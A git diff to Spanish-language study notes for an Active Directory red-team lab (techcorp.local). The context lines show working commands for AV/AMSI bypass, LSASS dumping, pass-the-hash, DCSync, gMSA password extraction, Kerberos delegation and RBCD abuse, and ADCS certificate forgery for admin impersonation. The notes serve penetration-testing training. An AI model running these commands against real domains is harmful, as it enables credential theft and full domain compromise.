@@ -182,6 +182,7 @@ RunWithPathAsAdmin.bat
 ```
 
 ¿Cómo llevar estos archivos al equipo? Una opción es escribir los ``.bat`` o ``.dll``
+
 ## Bypassing AV Signatures for PowerShell
 
 ### Cargar scripts en memoria y evitar la detección usando AMSI bypass
@@ -211,6 +212,7 @@ Herramienta para identificar codigo y strings desde un binario/archivo que puede
 ### DefenderCheck
 DefenderCheck.exe PowerUp.ps1
 ```
+
 ## NetLoader
 
 Podemos utilizar NetLoader  para entregar nuestras cargas binarias.
@@ -381,6 +383,7 @@ Get-NetLocalGroupMember -ComputerName us-dc
 ### Necesita privilegios de administrador para realizar consulta
 Get-NetLocalGroupMember -ComputerName us-dc -GroupName Administrators
 ```
+
 ## GPO
 
 - Las GPOs ayudan a gestionar configuraciones y cambios
@@ -405,6 +408,7 @@ Get-DomainGPOComputerLocalGroupMapping –ComputerIdentity us-mgmt.us.techcorp.l
 ### Obtener máquinas donde el usuario dado es miembro de un grupo específico
 Get-DomainGPOUserLocalGroupMapping -Identity studentuser1 -Verbose
 ```
+
 ## OUs
 
 ```
@@ -436,6 +440,7 @@ Get-ADOrganizationalUnit -Identity 'OU=StudentsMachines,DC=us,DC=techcorp,DC=loc
 
 Get-DomainGPOComputerLocalGroupMapping -OUIdentity 'OU=Mgmt,DC=us,DC=techcorp,DC=local'
 ```
+
 ## ACLs
 
 - ``SecurityIdentifier`` es el SID del objeto que tiene permisos sobre ``ObjectDN`` (ejm: studentuser76)
@@ -499,6 +504,7 @@ Get-DomainTrust –Domain techcorp.local
 Get-ADTrust
 Get-ADTrust –Identity techcorp.local
 ```
+
 ## Forest
 
 ```
@@ -524,7 +530,8 @@ Get-ForestTrust
 Get-ADTrust -Filter 'intraForest -ne $True' -Server (Get-ADForest).Name
 ```
 
-Nota: En una confianza bidireccional o confianza unidireccional entrante de eu.local a us.techcorp.local, podemos extraer información del bosque eu.local.
+Nota: En una confianza bidireccional o confianza unidireccional entrante de eu.local a us.techcorp.local, se puede extraer información del bosque eu.local desde us.techcorp.local.
+
 # User Hunting
 
 - ``Find-LocalAdminAccess`` puede ser algo ruidoso, además de generar eventos (4624 y 4634)
@@ -557,6 +564,7 @@ Find-DomainUserLocation -CheckAccess
 ### Buscar computadoras (File Servers and Distributed File servers) donde un domain admin (o user/group) tiene sesiones
 Find-DomainUserLocation –Stealth
 ```
+
 # Privilege Escalation
 
 ## Miscelanea
@@ -586,6 +594,7 @@ Get-ModifiableService -Verbose
 ```
 
 - ``Get-WmiObject | ft SystemName,Name,StartName`` para ver los servicios que se ejecutan y sus privilegios de inicio.
+
 # PowerShell Remoting
 
 - PSRemoting se compara con "psexec mejorado" porque proporciona una forma más robusta y rica en funciones para ejecutar comandos en máquinas remotas
@@ -782,6 +791,7 @@ Get-LapsPermissions.ps1
 Import-Module C:\AD\Tools\AdmPwd.PS\AdmPwd.PS.psd1 
 Find-AdmPwdExtendedRights -Identity OUDistinguishedName
 ```
+
 ### Explotación
 
 ```
@@ -807,6 +817,7 @@ $creds = New-Object System.Management.Automation.PSCredential ("us-mailmgmt\admi
 $mailmgmt = New-PSSession -ComputerName us-mailmgmt -Credential $creds
 $mailmgmt
 ```
+
 # Lateral Movement
 
 - Mimikatz puede ser usado para dumpear credenciales, tickets y mas interesantes ataques.
@@ -846,6 +857,7 @@ Lsass_Shtinkering.exe
 - Funciona en Windows 10, Server 2022.
 - Durante nuestras pruebas encontramos que no funciona en Server 2019.
 ```
+
 ### LOLBAS
 
 ```
@@ -857,6 +869,7 @@ rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <lsass process ID> C:\Use
 ```
 
 Desde una máquina Linux usar ``impacket`` o ``Physmem2profit``.
+
 ## OverPassTheHash
 
 OPTH genera un nuevo proceso con las credenciales especificadas, hashes NTLM o claves AES
@@ -869,6 +882,7 @@ SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:us.techcorp.local /aes
 
 ### Los comandos anteriores inician una sesión PowerShell con un tipo de inicio de sesión 9 (igual que runas /netonly).
 ```
+
 ## DCSync
 
 - DCSync Attack aprovecha la función de replicación (asociado al servicio de replicación) para extraer credenciales de datos específicos, usarios o todos los usuarios.
@@ -884,6 +898,7 @@ SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
 
 • By default, Domain Admins privileges are required to run DCSync
 ```
+
 ## gMSA
 
 - Una cuenta de servicio gestionada por grupo (gMSA) que proporciona gestión automática de contraseñas, gestión de SPN y administración delegada para cuentas de servicio en varios servidores.
@@ -891,6 +906,7 @@ SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
 - Se genera una contraseña aleatoria de 256 bytes que se rota cada 30 días.
 - Cuando un usuario autorizado lee el atributo '``msds ManagedPassword``' se calcula la contraseña gMSA.
 - Sólo los administradores especificados explícitamente pueden leer el blob de contraseñas. Incluso los Administradores de Dominio no pueden leerlo por defecto.
+
 ### Enumeration
 
 - Un gMSA tiene la clase de objeto '``msDS-GroupManagedServiceAccount``'. Esto puede para encontrar las cuentas.
@@ -902,6 +918,7 @@ Get-ADServiceAccount -Filter *
 ### Usando PowerView
 Get-DomainObject -LDAPFilter '(objectClass=msDS-GroupManagedServiceAccount)'
 ```
+
 ### Explotación
 
 - El atributo 'msDS-GroupMSAMembership' (PrincipalsAllowedToRetrieveManagedPassword) lista los principales que pueden leer el blob de contraseñas.
@@ -931,6 +948,7 @@ ConvertTo-NTHash -Password $decodedpwd.SecureCurrentPassword
 ```
 GMSAPasswordReader.exe --accountname jumpone
 ```
+
 ### Golden gMSA
 
 - La contraseña gMSA se calcula aprovechando el secreto almacenado en el objeto clave raíz KDS.
@@ -944,6 +962,7 @@ GMSAPasswordReader.exe --accountname jumpone
 - Cuando configuras con Unconstrained Delegation en un servicio, los clientes delegan/envian su TGT al servidor.
 - El servicio puede actuar en nombre de un usuario o equipo en la red usando el TGT.
 - Para configurar esto, se necesitan permisos de Domain o Enterprise Admin, en particular, ``SeEnableDelegation``.
+
 #### Enumeración
 
 - Ten en cuenta que pueden haber usuarios o equipos con la propiedad ``unconstrained delegation``
@@ -958,6 +977,7 @@ Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
 Get-ADComputer -Filter {TrustedForDelegation -eq $True}
 Get-ADUser -Filter {TrustedForDelegation -eq $True}
 ```
+
 #### Explotación - Phishing
 
 1. Comprometer servidor o cuenta de usuario(servicio) "Unconstrained delegation" habilitado 
@@ -977,6 +997,7 @@ Invoke-Mimikatz –Command '"kerberos::ptt ticket.kirbi"'
 ```
 
 Por defecto, si se intenta acceder a cualquier archivo compartido es una autenticación, esto puede ayudar a realizar un ataque de Ingeniería Social para explotar Unconstrained Delegation.
+
 #### Explotación - Coerced Authentication
 ##### PrinterBug
 
@@ -996,6 +1017,7 @@ Por defecto, si se intenta acceder a cualquier archivo compartido es una autenti
 ```
 
 - El evento de inicio de sesión que Rubeus utiliza para supervisar los TGT es ``4624`` (Account Logon)
+  
 ##### PetitPotam
 
 PetitPotam utiliza la función ``EfsRpcOpenFileRaw`` del protocolo MS-EFSRPC (Encrypting File System Remote Protocol) y no necesita credenciales cuando se utiliza contra un DC.
@@ -1029,6 +1051,7 @@ Y con el TGT en la sesión se pueden, se pueden acceder a recursos compartidos, 
 ### Ejecutar DCSync
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
 ```
+
 #### Adicional
 
 Solo como dato adicional, lo siguiente es un ataque desde Linux (no es parte del curso):
@@ -1037,18 +1060,21 @@ Si se compromete una cuenta de usuario(servicio) con "Unconstrained delegation" 
 2. Una vez registrado este registro DNS, añadiremos el SPN ``CIFS/nuestro_registro_dns`` a la cuenta que hemos comprometido, que se encuentra en una delegación no restringida. 
 3. Así, si una víctima intenta conectarse a través de SMB a nuestra máquina falsa, enviará una copia de su TGT en su ticket TGS, ya que solicitará un ticket para ``CIFS/nuestro_registro_dns``. 
 4. Este ticket TGS se enviará a la dirección IP que elegimos al registrar el registro DNS, es decir, nuestra máquina de ataque. Todo lo que tenemos que hacer entonces es extraer el TGT y utilizarlo. Este ataque también implica Coerced Authentication.
-### Kerberos Delegation - Constrained Delegation
+
+## Kerberos Delegation - Constrained Delegation
 
 - Restringe los servicios a los que el servidor o cuenta de servicio puede actuar en nombre de un cliente.
 - Unconstrained guarda TGT, Constrained no guarda TGT.
 - Para realizar esto se realizaron algunas nuevas extensiones de kerberos (s4u)
 	Kerberos protocol transition extension, S4U2Self
 	Kerberos constrained delegation extension, S42Proxy
-##### S4U2Self
+
+#### S4U2Self
 
 - Permite a un servicio obtener un ticket de servicio para si mismo, es decir, si somos web01 podemos obtener un ticket para mi mismo(web01) en nombre de un cliente.
 - Cualquier servicio(cuenta con SPN registrado) puede invocar S4USelf.
-##### S4U2Proxy
+
+#### S4U2Proxy
 
 - Para invocarlo se necesita tener un ST como evidencia de que algún usuario se ha conectado.
 - Permite a un servicio obtener un ST en nombre del cliente antes conectado para un servicio diferente.
@@ -1060,13 +1086,15 @@ Existen dos formas de configurar Constrained Delegation:
 - Ejemplo: si el cliente se conecta con NTTLM hace uso de S4U2Self y S4U2Proxy, si se conecta con Kerberos hace uso de S4U2Proxy.
 
 Si el servicio solo usa S4U2proxy ("Kerberos Only"), el cliente delega su ST no TGT y cuando usa "Protocol Transition", el servicio no necesita nada del cliente mas que su nombre. Ejemplo, si se conecta vegeta es suficiente para el servicio para tener acceso a credenciales de vegeta
-### Kerberos Delegation - Constrained Delegation (Kerberos Only)
+
+## Kerberos Delegation - Constrained Delegation (Kerberos Only)
 
 - Requiere un ST adicional para invocar para invocar S4U2Proxy, y que el ticket sea forwardable.
 - Si consigues comprometer un servicio con kerberos only, y se conectan clientes al final dejarán sus ST y se puede abusar para invocar S4U2Proxy y acceder a servicios. Pero para esto, se debe esperar a que alguien se conecte.
 - Si la cuenta de servicio comprometida tiene la característica ``TRUSTED_TO_AUTH_FOR_DELEGATION``(Protocol Transition), al invocar S4U2Self, recibimos un ST forwardable. Si no tiene esa caracteristica, no es forwardable. 
 - La idea de la explotación es usar RBCD junto a Kerberos Only .
 - Como controlas un servicio que está configurado con Kerberos Only puedes configurarle a ese propio servicio RBCD. Harás que ese servicio confié en una cuenta controlada que pueda invocar S4U2Self y sacar un ticket forwardable para usar el S4U2Proxy . 
+
 #### Enumeración
 
 - La cuenta de servicio **NO** tiene la característica ``TRUSTED_TO_AUTH_FOR_DELEGATION``
@@ -1080,6 +1108,7 @@ Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-All
 Get-DomainUser –TrustedToAuth
 Get-DomainComputer –TrustedToAuth
 ```
+
 #### Explotación
 
 - Dado que ``ms-DS-MachineAccountQuota`` está establecido en 10 para todos los usuarios del dominio, cualquier usuario del dominio puede crear una nueva cuenta de máquina y unirse a la misma en el dominio actual.
@@ -1121,7 +1150,7 @@ C:\AD\Tools\Rubeus.exe s4u /tgs:doIGxjCCBsKgAwIBBaEDAgEWoo... /user:us-mgmt$
 ### Acceda a us-mssql utilizando WinRM como administrador del dominio.
 ```
 
-### Kerberos Delegation - Constrained Delegation (Protocol Transition)
+## Kerberos Delegation - Constrained Delegation (Protocol Transition)
 
 #### Enumeración
 
@@ -1172,6 +1201,7 @@ Rubeus.exe s4u /user:appsvc /rc4:1D49D390AC01D568F0EE9BE82BB74D4C /impersonateus
 ### Es posible debido al ticket de servicio sobre HTTP
 winrs -r:us-mssql cmd.exe
 ```
+
 #### Persistence
 
 - Tenga en cuenta que el ``msDS-AllowedToDelegateTo`` es la bandera de la cuenta de usuario que controla los servicios a los que una cuenta de usuario tiene acceso.  
@@ -1236,7 +1266,8 @@ Rubeus.exe s4u /user:devuser /rc4:539259E25A0361EC4A227DD9894719F6 /impersonateu
 ### Ataque DCSync
 C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
 ```
-### RBCD
+
+## RBCD
 
 - Para configurar RBCD no necesitas privilegios de Domain o Enterprise Admin
 - RBCD se configura en un atributo que tienen las cuentas de servicio llamada ``msDS-AllowedToActObBehalfOfOtherIdentity``, entonces si en algún momento tienes permisos de escritura para escribir este atributo en cualquier cuenta de servicio, le podrás configurar RBCD para que confíe en una cuenta que controles.
@@ -1272,14 +1303,13 @@ Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
 winrs -r:us-helpdesk cmd.exe
 ```
 
-
-
 # Cross Trust Attacks
 
 ## AD CS
 
 - Active Directory Certificate Services (AD CS) permite el uso de Public Key Infrastructure (PKI) en el bosque de Active Directory.  
 - AD CS ayuda a autenticar usuarios y máquinas, cifrar y firmar documentos, sistemas de archivos, correos electrónicos y mucho más.
+
 ### Terminología
 
 - CA - La autoridad de certificación que emite certificados. El servidor con función AD CS (DC o independiente) es la CA.  
@@ -1287,6 +1317,7 @@ winrs -r:us-helpdesk cmd.exe
 - CSR - Solicitud de firma de certificado realizada por un cliente a la CA para solicitar un certificado.  
 - Certificate Template: define la configuración de un certificado. Contiene información como permisos de inscripción, EKU, caducidad, etc.  
 - EKU OID: identificadores de objetos de usos de claves ampliados. Determinan el uso de una plantilla de certificado (autenticación de cliente, inicio de sesión con tarjeta inteligente, SubCA, etc.).  
+
 ### Certificate Service
 
 Existen muchas formas de encontrar certificados para su posterior explotación, una de esas formas es mediante el listado de certificados almacenados de forma local en la máquina.
@@ -1305,6 +1336,7 @@ reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SystemCertificates\MY\Certifica
 ### Exportar certificado
 ls cert:\LocalMachine\My\89C1171F6810A6725A47DB8D572537D736D4FF17 | Export-PfxCertificate -FilePath C:\Users\Public\pawadmin.pfx -Password (ConvertTo-SecureString -String 'SecretPass@123' -Force -AsPlainText)
 ```
+
 ### Abuse ADCS
 
 - Extraer certificados de usuario y de máquina
@@ -1312,6 +1344,7 @@ ls cert:\LocalMachine\My\89C1171F6810A6725A47DB8D572537D736D4FF17 | Export-PfxCe
 - Persistencia a nivel de usuario y máquina
 - Escalado a administrador de dominio y administrador de empresa
 - Persistencia de dominio
+
 ## Enumeración
 
 Que no aparezcan plantillas vulnerables no significa que no haya algún tipo de misconfiguración, puede que  tengamos permisos como algún usuario en particular.
@@ -1335,6 +1368,7 @@ Certify.exe find
 ### 
 Certify.exe find /vulnerable
 ```
+
 ## Explotación
 
 - En techcorp, el usuario pawadmin tiene derechos de inscripción a una plantilla ``ForAdminsofPrivilegedAccessWorkstations``
@@ -1354,24 +1388,23 @@ Certify.exe find /enrolleeSuppliesSubject
 C:\AD\Tools\Rubeus.exe asktgt /user:pawadmin /certificate:C:\AD\Tools\pawadmin.pfx /password:SecretPass@123 /nowrap /ptt
 ```
 
-
 ```
-- ¡Solicitar un certificado para DA!
+### Solicitar un certificado para DA
 C:\AD\Tools\Certify.exe request /ca:Techcorp-DC.techcorp.local\TECHCORP-DC-CA /template:ForAdminsofPrivilegedAccessWorkstations /altname:Administrator
 
-- Convertir de cert.pem a pfx:
+### Convertir de cert.pem a pfx
 C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\DA.pfx
 
-- Solicitar DA TGT e inyectarlo:
+### Solicitar DA TGT e inyectarlo
 C:\AD\Tools\Rubeus.exe asktgt /user:Administrator /certificate:C:\AD\Tools\DA.pfx /password:SecretPass@123 /nowrap /ptt
 ```
 
 ```
-• Request a certificate for EA!
+### Solicitar un certificado para EA
 C:\AD\Tools\Certify.exe request /ca:Techcorp-DC.techcorp.local\TECHCORP-DC-CA /template:ForAdminsofPrivilegedAccessWorkstations /altname:Administrator
-• Convert from cert.pem to pfx:
+### Convertir de cert.pem a pfx
 C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\EA.pfx
-• Request EA TGT and inject it:
+### Solicitar EA TGT e inyectarlo
 C:\AD\Tools\Rubeus.exe asktgt /user:techcorp.local\Administrator /dc:techcorp-dc.techcorp.local /certificate:C:\AD\Tools\EA.pfx /password:SecretPass@123 /nowrap /ptt
 ```
 
@@ -1414,12 +1447,13 @@ Un AD local puede integrarse con Azure AD utilizando Azure AD Connect con los si
 - Tener en cuenta que la descripción de la cuenta ``MSOL_<RANDOM_ID>`` se crea de forma predeterminada cuando está la conexión con Azure. La descripción sigue el siguiente texto: "Cuenta creada por Microsoft Azure Active Directory Connect con el identificador de instalación ... que se ejecuta en el equipo ... "
 
 ```
-• Using PowerView:
+### Using PowerView:
 Get-DomainUser -Identity "MSOL_*" -Domain techcorp.local
 
-• Using the ActiveDirectory module:
+### Using the ActiveDirectory module:
 Get-ADUser -Filter "samAccountName -like 'MSOL_*'" -Server techcorp.local -Properties * | select SamAccountName,Description | fl
 ```
+
 #### Explotación
 
 - Tener en cuenta que ADCCONECT ejecuta powershell.exe en el fondo de forma que se iniciarían transcripciones o bloques de guion en el registro. Si desea evitar la ejecución de powershell, tienes que modificar la conexión ``ADCConnect.ps1``
@@ -1432,6 +1466,7 @@ Get-ADUser -Filter "samAccountName -like 'MSOL_*'" -Server techcorp.local -Prope
 ### Ejecución de comando como MSOL_<RANDOM_ID>
 runas /user:techcorp.local\MSOL_<RANDOM_ID> /netonly cmd
 ```
+
 # Cross Domain Attacks (Child Domain to Forest Root)
 
 ## sIDHistory
